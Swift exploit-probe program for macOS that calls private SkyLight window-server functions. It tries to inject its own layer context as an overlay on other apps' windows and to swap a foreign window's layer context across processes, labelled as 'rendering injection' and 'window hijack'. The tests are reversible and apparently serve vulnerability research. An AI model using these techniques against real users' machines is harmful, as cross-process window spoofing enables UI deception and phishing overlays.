/// Probe10 — SLSGetWindowLayerContext / SLSSetWindowLayerContext injection
///
/// From symbol analysis:
///   SLSGetWindowLayerContext(cid, wid) → UInt32
///   SLSSetWindowLayerContext(cid, wid, layerCtxId) → Int32
///
/// The hypothesis: SLSTransactionSetWindowOverlayContext expects a LAYER CONTEXT ID
/// (from the same SLS layer context table), NOT a CAContext ID.
/// SLSGetWindowLayerContext returns the current layer context ID for a window —
/// calling it on our own window gives us a VALID ID in the correct format.
///
/// Attack vectors:
///   A. Get our own window's layer context ID via SLSGetWindowLayerContext.
///      Pass it as overlay context on foreign window — our rendering engine
///      renders content for that context, which then shows as overlay.
///
///   B. SLSSetWindowLayerContext cross-process — directly replace foreign window's
///      layer context with ours. If accepted, our process renders that window.
///
///   C. SLSCreateLayerContext id1 (large value) — try as UInt32 as overlay ctx.
///
///   D. SLWindowContextCreate — separate context type, different from SLS layer ctx.
///      Signature: SLWindowContextCreate(cid, wid, options?) → SLWindowContext?
///
/// Also checks SLSInstallRemoteContextNotificationHandler for remote context events.

import AppKit
import QuartzCore
import SkyLightBridge

let lib = dlopen("/System/Library/PrivateFrameworks/SkyLight.framework/SkyLight", RTLD_LAZY)!
func sym<T>(_ name: String) -> T { unsafeBitCast(dlsym(lib, name)!, to: T.self) }

typealias TxCreateFn = @convention(c) (Int32) -> UnsafeMutableRawPointer?
typealias TxCommitFn = @convention(c) (UnsafeMutableRawPointer, Int32, Int32) -> Int32
let txCreate: TxCreateFn = sym("SLSTransactionCreate")
let txCommit: TxCommitFn = sym("SLSTransactionCommit")

typealias TxOverlayGroupFn = @convention(c) (UnsafeMutableRawPointer, CGWindowID, Bool) -> Void
let setOverlayGroup: TxOverlayGroupFn = sym("SLSTransactionSetWindowCreatesOverlayCompositingGroup")
typealias TxOverlayCtxFn = @convention(c) (UnsafeMutableRawPointer, CGWindowID, UInt32) -> Void
let setOverlayCtx: TxOverlayCtxFn = sym("SLSTransactionSetWindowOverlayContext")

// SLSGetWindowLayerContext(cid, wid) → UInt32
typealias GetLayerCtxFn = @convention(c) (Int32, CGWindowID) -> UInt32
let getLayerCtx: GetLayerCtxFn = sym("SLSGetWindowLayerContext")

// SLSSetWindowLayerContext(cid, wid, ctxId) → Int32
typealias SetLayerCtxFn = @convention(c) (Int32, CGWindowID, UInt32) -> Int32
let setLayerCtx: SetLayerCtxFn = sym("SLSSetWindowLayerContext")

// SLSCreateLayerContext(cid, &id1, &id2) → Int32
typealias CreateLayerCtxFn = @convention(c) (Int32, UnsafeMutablePointer<Int32>, UnsafeMutablePointer<Int32>) -> Int32
let createLayerCtx: CreateLayerCtxFn = sym("SLSCreateLayerContext")

// SLWindowContextCreate — try various signatures
// Attempt: (cid, wid, options) → opaque pointer
typealias SLWinCtxCreateFn = @convention(c) (Int32, CGWindowID, UInt32) -> UnsafeMutableRawPointer?
let slWinCtxCreate: SLWinCtxCreateFn = sym("SLWindowContextCreate")
typealias SLWinCtxGetConnFn = @convention(c) (UnsafeMutableRawPointer) -> Int32
let slWinCtxGetConn: SLWinCtxGetConnFn = sym("SLWindowContextGetConnection")
typealias SLWinCtxGetWinFn = @convention(c) (UnsafeMutableRawPointer) -> CGWindowID
let slWinCtxGetWin: SLWinCtxGetWinFn = sym("SLWindowContextGetWindow")

let ourCID = SLSMainConnectionID()

// ObjC msgSend for CALayer rendering
typealias MsgSend0 = @convention(c) (AnyObject, Selector) -> AnyObject?
typealias MsgSendVoid1 = @convention(c) (AnyObject, Selector, AnyObject?) -> Void
let _msgSend = unsafeBitCast(dlsym(dlopen(nil, RTLD_LAZY)!, "objc_msgSend")!, to: MsgSend0.self)
func msgSend1(_ obj: AnyObject, _ s: String, _ a: AnyObject?) -> AnyObject? {
    typealias F = @convention(c) (AnyObject, Selector, AnyObject?) -> AnyObject?
    return unsafeBitCast(_msgSend, to: F.self)(obj, NSSelectorFromString(s), a)
}
func msgSendVoid1(_ obj: AnyObject, _ s: String, _ a: AnyObject?) {
    unsafeBitCast(_msgSend, to: MsgSendVoid1.self)(obj, NSSelectorFromString(s), a)
}

class AppDelegate: NSObject, NSApplicationDelegate {
    var ourWindow: NSWindow!

    func applicationDidFinishLaunching(_ n: Notification) {
        ourWindow = NSWindow(
            contentRect: NSRect(x: 50, y: 200, width: 400, height: 300),
            styleMask: [.titled, .closable], backing: .buffered, defer: false)
        ourWindow.title = "Probe10 Layer Context"
        ourWindow.backgroundColor = .cyan
        ourWindow.makeKeyAndOrderFront(nil)
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) { self.runTests() }
    }

    func foreignWID() -> CGWindowID? {
        for bid in ["com.apple.Notes", "com.google.Chrome", "com.apple.TextEdit"] {
            if let app = NSRunningApplication.runningApplications(withBundleIdentifier: bid).first {
                app.activate(options: [])
                Thread.sleep(forTimeInterval: 0.3)
                let wlist = CGWindowListCopyWindowInfo([.optionOnScreenOnly, .excludeDesktopElements], kCGNullWindowID)
                    as? [[CFString: Any]] ?? []
                if let info = wlist.first(where: {
                    ($0[kCGWindowOwnerPID as CFString] as? Int32) == app.processIdentifier &&
                    ($0[kCGWindowLayer as CFString] as? Int32 ?? 99) == 0
                }), let wid = info[kCGWindowNumber as CFString] as? CGWindowID {
                    print("Target: \(app.localizedName ?? bid) WID=\(wid)")
                    return wid
                }
            }
        }
        return nil
    }

    func runTests() {
        guard let teWID = foreignWID() else { print("No target app"); exit(1) }
        let ourWID = windowID(for: ourWindow)
        print("OurCID=\(ourCID)  OurWID=\(ourWID)  TeWID=\(teWID)")
        print("")

        // ── Test 1: SLSGetWindowLayerContext — what ID does our window have? ──
        print("=== Test 1: SLSGetWindowLayerContext on own vs foreign window ===")
        let ourLayerCtxId = getLayerCtx(ourCID, ourWID)
        let teLayerCtxId  = getLayerCtx(ourCID, teWID)
        print("  OurWindow  layerCtxId=\(ourLayerCtxId)  (hex: 0x\(String(ourLayerCtxId, radix:16)))")
        print("  Foreign    layerCtxId=\(teLayerCtxId)   (hex: 0x\(String(teLayerCtxId, radix:16)))")
        print("  NOTE: 0 = no layer context, non-0 = valid SLS context ID")
        print("")

        // ── Test 2: Use ourLayerCtxId as overlay context on OWN window ──
        // If our window's layer ctx ID is valid, this should work (it's ours)
        print("=== Test 2: Overlay our own layer context on own window (sanity check) ===")
        if ourLayerCtxId != 0 {
            if let txn = txCreate(ourCID) {
                setOverlayGroup(txn, ourWID, true)
                setOverlayCtx(txn, ourWID, ourLayerCtxId)
                let cs = txCommit(txn, 0, 0)
                print("  setOverlay(ourLayerCtxId=\(ourLayerCtxId)) on OWN window: commit=\(cs)")
                print("  [\(cs == 0 ? "ACCEPTED — layer ctx ID is valid format!" : "rejected cs=\(cs)")]")
            }
            Thread.sleep(forTimeInterval: 2.0)
            if let txn = txCreate(ourCID) {
                setOverlayCtx(txn, ourWID, 0)
                setOverlayGroup(txn, ourWID, false)
                _ = txCommit(txn, 0, 0)
            }
        } else {
            print("  ourLayerCtxId == 0, skipping")
        }
        print("")

        // ── Test 3: Use ourLayerCtxId as overlay context on FOREIGN window ──
        print("=== Test 3: Our layer context ID as overlay on FOREIGN window ===")
        if ourLayerCtxId != 0 {
            // Create a bright red layer in our process first
            if let ctxClass = NSClassFromString("CAContext"),
               let ctx = msgSend1(ctxClass as AnyObject, "localContextWithOptions:", nil) {
                let layer = CALayer()
                layer.backgroundColor = CGColor(red: 1, green: 0, blue: 0, alpha: 1)
                layer.frame = CGRect(x: 0, y: 0, width: 2000, height: 2000)
                let tl = CATextLayer()
                tl.string = "LAYER CTX INJECTION"
                tl.frame = CGRect(x: 50, y: 50, width: 500, height: 60)
                tl.fontSize = 32; tl.foregroundColor = .white
                layer.addSublayer(tl)
                msgSendVoid1(ctx, "setLayer:", layer)
                print("  Primed red CALayer on local CAContext")
            }

            if let txn = txCreate(ourCID) {
                setOverlayGroup(txn, teWID, true)
                setOverlayCtx(txn, teWID, ourLayerCtxId)
                let cs = txCommit(txn, 0, 0)
                print("  setOverlay(ourLayerCtxId=\(ourLayerCtxId)) on FOREIGN: commit=\(cs)")
                print("  [\(cs == 0 ? "ACCEPTED! — check screen for red overlay!" : "rejected cs=\(cs)")]")
            }
            Thread.sleep(forTimeInterval: 5.0)
            print("  *** CRITICAL: did red 'LAYER CTX INJECTION' appear on foreign window? ***")
            Thread.sleep(forTimeInterval: 2.0)
            if let txn = txCreate(ourCID) {
                setOverlayCtx(txn, teWID, 0)
                setOverlayGroup(txn, teWID, false)
                _ = txCommit(txn, 0, 0)
            }
        } else {
            print("  skipped: ourLayerCtxId == 0")
        }
        print("")

        // ── Test 4: SLSSetWindowLayerContext cross-process ──
        print("=== Test 4: SLSSetWindowLayerContext(ourCID, foreignWID, ourLayerCtxId) ===")
        if ourLayerCtxId != 0 {
            let r = setLayerCtx(ourCID, teWID, ourLayerCtxId)
            print("  SLSSetWindowLayerContext status=\(r)")
            print("  [\(r == 0 ? "ACCEPTED — foreign window now uses our layer context!" : "rejected r=\(r)")]")
            Thread.sleep(forTimeInterval: 3.0)
            // Restore
            if teLayerCtxId != 0 {
                _ = setLayerCtx(ourCID, teWID, teLayerCtxId)
                print("  Restored foreign window layer context to \(teLayerCtxId)")
            }
        } else {
            print("  skipped: ourLayerCtxId == 0")
        }
        print("")

        // ── Test 5: SLSCreateLayerContext id1 as overlay context ──
        print("=== Test 5: SLSCreateLayerContext id1 (large value) as overlay context ===")
        var slsId1: Int32 = 0; var slsId2: Int32 = 0
        let st = createLayerCtx(ourCID, &slsId1, &slsId2)
        print("  SLSCreateLayerContext: status=\(st) id1=\(slsId1) id2=\(slsId2)")
        let id1u = UInt32(bitPattern: slsId1)
        print("  Using id1 as UInt32=\(id1u)")
        if let txn = txCreate(ourCID) {
            setOverlayGroup(txn, teWID, true)
            setOverlayCtx(txn, teWID, id1u)
            let cs = txCommit(txn, 0, 0)
            print("  setOverlay(id1u=\(id1u)) on foreign: commit=\(cs)")
            print("  [\(cs == 0 ? "ACCEPTED — SLS id1 is valid overlay context!" : "rejected cs=\(cs)")]")
        }
        Thread.sleep(forTimeInterval: 3.0)
        if let txn = txCreate(ourCID) {
            setOverlayCtx(txn, teWID, 0)
            setOverlayGroup(txn, teWID, false)
            _ = txCommit(txn, 0, 0)
        }
        print("")

        // ── Test 6: SLWindowContextCreate ──────────────────────────────────────
        print("=== Test 6: SLWindowContextCreate ===")
        if let slWinCtx = slWinCtxCreate(ourCID, ourWID, 0) {
            let conn = slWinCtxGetConn(slWinCtx)
            let win  = slWinCtxGetWin(slWinCtx)
            print("  SLWindowContextCreate: conn=\(conn) win=\(win)")
            // The context is opaque — it might contain a context ID we can read
            // Read first 8 bytes as UInt32 pairs
            let p = slWinCtx.assumingMemoryBound(to: UInt32.self)
            print("  Raw[0..3]: \(p[0]) \(p[1]) \(p[2]) \(p[3])")
        } else {
            print("  SLWindowContextCreate returned nil")
        }
        print("")

        // ── Summary ─────────────────────────────────────────────────────────────
        print("=== Summary ===")
        print("ourLayerCtxId=\(ourLayerCtxId)  teLayerCtxId=\(teLayerCtxId)")
        print("If Test 2 commit==0: layer ctx ID is valid overlay context format")
        print("If Test 3 commit==0 + visual: RENDERING INJECTION CONFIRMED")
        print("If Test 4 status==0: SLSSetWindowLayerContext cross-process works = window hijack")
        exit(0)
    }
}

let app = NSApplication.shared
app.setActivationPolicy(.regular)
let delegate = AppDelegate()
app.delegate = delegate
app.run()
